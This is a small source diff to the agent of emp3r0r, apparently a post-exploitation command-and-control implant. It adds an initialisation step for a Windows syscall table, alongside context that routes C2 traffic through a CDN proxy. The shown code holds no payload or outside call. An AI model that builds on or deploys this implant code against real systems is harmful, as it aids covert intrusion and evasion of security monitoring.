@@ -19,6 +19,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
+	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
@@ -32,7 +33,6 @@ func agent_main() {
 		}
 	}()
 
-	// accept env vars
 	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 	if err != nil {
 		logging.Fatalf("%s: %v", os.DevNull, err)
@@ -117,6 +117,12 @@ func agent_main() {
 			}
 		}()
 		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
+	}
+
+	// Initialize Windows syscall table
+	syscall.RuntimeSyscallTable, err = syscall.InitializeSyscallTable()
+	if err != nil {
+		logging.Errorf("Failed to initialize syscall table: %v", err)
 	}
 
 	// ────────────────────────────────────────────────────────────────────────────
